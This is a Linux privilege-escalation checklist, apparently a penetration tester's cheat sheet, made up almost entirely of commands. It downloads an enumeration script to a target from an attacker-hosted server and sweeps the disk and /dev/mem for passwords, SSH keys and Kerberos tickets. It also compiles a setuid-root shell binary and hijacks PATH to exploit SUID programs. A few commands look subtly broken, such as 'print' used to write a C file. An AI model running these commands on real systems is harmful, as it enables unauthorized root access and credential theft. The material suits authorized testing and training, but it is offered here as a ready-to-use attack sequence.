# Linux Privilege Escalation Checklist

# Check for useful tools
which awk perl python ruby gcc cc vi vim nmap find netcat nc wget tftp ftp curl 2>/dev/null

# Install Linenum.sh
mkdir /tmp/linenum
cd /tmp/linenum
wget 'https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh' -O ./linenum.sh
python -m http.server

On Target:
wget 'http://172.28.128.1:8000/linenum.sh' -O /tmp/linenum.sh

# Looting Passwords
grep -nril 'password' /home/ 2> /dev/null
grep -R -i password /home/*  2> /dev/null
grep -nril 'password' /var/  2> /dev/null
find / -iname *password* 2>/dev/null
grep --color=auto -rnw '/' -ie "PASSWORD" --color=always 2> /dev/null
find . -type f -exec grep -i -I "PASSWORD" {} /dev/null \;

Also search for:
/home/*/.ssh/id*             ;; SSH keys, often passwordless
/tmp/krb5cc_*                ;; Kerberos tickets
/tmp/krb5.keytab             ;; Kerberos tickets
/home/*/.gnupg/secring.gpgs  ;; PGP keys

find / -type f -iname *.txt   2>/dev/null
find / -type f -iname *.zip   2>/dev/null
find / -type f -iname *.doc   2>/dev/null
find / -type f -iname *.xls   2>/dev/null
find / -type f -iname config* 2>/dev/null
find / -type f -iname *.rar   2>/dev/null
find / -type f -iname *.docx  2>/dev/null
find / -type f -iname *.sql   2>/dev/null

Check: /etc/security/opasswd

## In-Memory Passwords
strings /dev/mem -n10 | grep -i PASS

## Files containing in name "password"
updatedb
locate password

## SSH Keys
find / -name authorized_keys 2> /dev/null
find / -name id_rsa 2> /dev/null

## Last Edited Files
find / -mmin -10 2>/dev/null | grep -Ev "^/proc"

# Detect CRON jobs
## print both commands and file system events and scan procfs every 1000 ms (=1sec)
pspy64 -pf -i 1000 

# Find SUID binaries
find / -perm -4000 -type f -exec ls -la {} 2>/dev/null \;
find / -uid 0 -perm -4000 -type f 2>/dev/null

# Create SUID binaries
print 'int main(void){\nsetresuid(0, 0, 0);\nsystem("/bin/sh");\n}' > /tmp/suid.c   
gcc -o /tmp/suid /tmp/suid.c  
sudo chmod +x /tmp/suid # execute right
sudo chmod +s /tmp/suid # setuid bit

# Exploiting SUID binaries
## Relative Path (Whenever a SUID binary is calling a program, e.g., cat)
echo $PATH
echo '/bin/bash' > /tmp/cat
chmod 777 cat
export PATH=/tmp:$PATH


